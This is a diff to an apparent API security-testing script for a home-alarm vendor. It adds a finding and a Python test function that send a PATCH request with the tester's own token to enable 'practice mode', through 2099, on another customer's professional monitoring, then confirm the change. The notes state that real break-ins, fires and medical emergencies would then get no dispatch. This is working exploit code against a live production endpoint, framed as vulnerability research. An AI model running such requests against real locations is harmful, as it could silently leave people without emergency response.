@@ -423,6 +423,33 @@ FINDINGS = [
                   '(names, emails, roles of all authorized users). '
                   'Test: POST /locations/{victim_locationId} {"granteeName":"Test","granteeEmail":"probe@test.invalid","role":"MANAGER"}; '
                   '200/201 = CRITICAL. Check if invitation email sent (if so, do NOT use real victim addresses in test).'),
+    Finding("F40", "CRITICAL", "Professional Monitoring Suspension IDOR — Enable Practice Mode on Victim System",
+            "app_hub", "/monitoring/v1/locations/{locationId}/monitoring", "PATCH", None,
+            verified=False,
+            notes='APK: openapi/monitoring/api/V1Api.java, openapi/monitoring/model/PatchMonitoring.java, '
+                  'PatchServiceStatus.java, PatchServiceStatusSetting.java (classes14.dex). '
+                  'Client constructed via MonitoringRestClientKt.createMonitoringRestClient: '
+                  'base = APP_HUB_SERVICE_URL.newBuilder("monitoring") -> '
+                  'https://app-hub.prd.aser.simplisafe.com/monitoring. '
+                  'Endpoints: '
+                  'GET /v1/locations/{locationId}/monitoring -> Monitoring{monitoringServiceProviderId, serviceStatus, monitoringServiceProviderStatus}. '
+                  'PATCH /v1/locations/{locationId}/monitoring body: '
+                  'PatchMonitoring{serviceStatus: PatchServiceStatus{practiceMode: PatchServiceStatusSetting{isEnabled: bool, endTimestamp: OffsetDateTime?, duration: String?}}}. '
+                  'GET /v1/locations/{locationId}/jurisdiction -> LocationJurisdiction{agencies, rules, fineInfo}. '
+                  'IDOR attack: '
+                  'PATCH /monitoring/v1/locations/{victim_locationId}/monitoring '
+                  '{"serviceStatus": {"practiceMode": {"isEnabled": true, "endTimestamp": "2099-12-31T23:59:59Z"}}} '
+                  'with own valid token. '
+                  'If locationId not JWT-bound: practice mode activated on victim system. '
+                  'Impact: during real alarm (break-in, fire, medical emergency) monitoring center treats '
+                  'all events as practice runs -> no police/fire/EMS dispatched. '
+                  'Victim believes system is monitored; monitoring center silently takes no action. '
+                  'Life-safety impact identical to disabling professional monitoring entirely. '
+                  'Secondary: GET /v1/locations/{victim_locationId}/monitoring -> reads current monitoring state '
+                  '(provider, status) — confirms monitoring service and provider ID. '
+                  'Test: PATCH /monitoring/v1/locations/{victim_locationId}/monitoring '
+                  '{"serviceStatus":{"practiceMode":{"isEnabled":true}}} with own token; '
+                  '200 = CRITICAL. Verify by GET same path -> practiceMode.isEnabled=true on victim location.'),
 ]
 
 
@@ -1288,6 +1315,30 @@ def test_recording_deletion_idor(token, victim_clip_id):
         _print("INFO", 404, f"Not found — clipId may belong to different namespace or not exist")
     else:
         _print("INFO", r.status_code, f"recording delete: {r.text[:100]}")
+
+
+def test_monitoring_suspension_idor(token, victim_location_id):
+    """F40: Enable practice mode on victim's monitoring — suspends professional dispatch during real alarms."""
+    print(f"\n=== F40 — Professional Monitoring Suspension IDOR (locationId={victim_location_id}) ===")
+    base = f"{SERVICES['app_hub']}/monitoring"
+    r = get(f"{base}/v1/locations/{victim_location_id}/monitoring", token=token)
+    if r and r.status_code == 200:
+        _print("CRIT", 200, f"MONITORING READ locationId={victim_location_id}: {r.text[:200]}")
+    else:
+        _print("INFO", r.status_code if r else 0,
+               f"monitoring get: {r.text[:80] if r else 'no response'}")
+    body = {"serviceStatus": {"practiceMode": {"isEnabled": True, "endTimestamp": "2099-12-31T23:59:59Z"}}}
+    r2 = patch(f"{base}/v1/locations/{victim_location_id}/monitoring", token=token, json=body)
+    if not r2:
+        print("  PATCH failed"); return
+    if r2.status_code in (200, 201, 204):
+        _print("CRIT", r2.status_code,
+               f"PRACTICE MODE ENABLED locationId={victim_location_id} — monitoring dispatch suspended")
+        r3 = get(f"{base}/v1/locations/{victim_location_id}/monitoring", token=token)
+        if r3 and r3.status_code == 200:
+            _print("CRIT", 200, f"CONFIRMED state: {r3.text[:200]}")
+    else:
+        _print("INFO", r2.status_code, f"monitoring patch: {r2.text[:100]}")
 
 
 def test_webrtc_idor(token, victim_camera_uuid, victim_sid):
